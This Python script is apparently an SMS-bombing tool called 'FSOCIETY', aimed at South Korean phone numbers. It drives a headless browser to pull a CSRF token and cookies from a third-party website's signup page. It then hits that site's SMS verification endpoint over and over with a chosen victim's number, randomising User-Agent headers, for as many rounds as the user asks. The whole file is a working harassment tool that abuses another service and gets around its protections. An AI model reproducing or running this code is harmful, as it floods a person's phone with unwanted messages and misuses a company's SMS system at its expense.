import time
import requests
from fake_useragent import UserAgent
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import webbrowser
import os
import time

csrf = None
cookie = None

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(r"""
███████╗███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗
██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
█████╗  ███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝ 
██╔══╝  ╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝  
██║     ███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║   
╚═╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝               
           
        [0x01] FSOCIETY is bulk SMS +82
        [0x02] Author    : cybermad
        [0x03] Github    : https://github.com/cybermads
        [0x04] Telegram  : t.me/cybermads 
          """)
def bypass():
    global csrf, cookie
    try:
        options = Options()
        options.add_argument("--headless")
        driver = webdriver.Chrome(options=options)
        driver.get("https://vip82tv.com/user/join")
        time.sleep(2)

        token = driver.find_element(By.NAME, "csrf_test_name")
        csrf = token.get_attribute("value")
        cookie = {c['name']: c['value'] for c in driver.get_cookies()}
        driver.quit()
        
    except:
        pass

def api(target, count):
    for i in range(1, count + 1):
        headers = {
            "User-Agent": UserAgent().random,
            "Referer": "https://vip82tv.com/user/join",
            "Origin": "https://vip82tv.com",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }

        data = {
            "telnum": target,
            "csrf_test_name": csrf
        }

        try:
            r = requests.post("https://vip82tv.com/user/smsNumSend", headers=headers, cookies=cookie, data=data, timeout=5)
            print(f"""
███████╗███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗
██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
█████╗  ███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝ 
██╔══╝  ╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝  
██║     ███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║   
╚═╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝            

[0x01] Target  : {target}
[0x02] Count   : {i}
[0x03] Status  : {r.status_code}
[0x04] Headers : {headers}
            """)
        except:
            pass

        time.sleep(1)

def API1():
    banner()
    target = input("[+] +82           > ")
    count = int(input("[+] count     > "))
    webbrowser.open("https://discord.gg/nyphor")

    bypass()
    api(target, count)
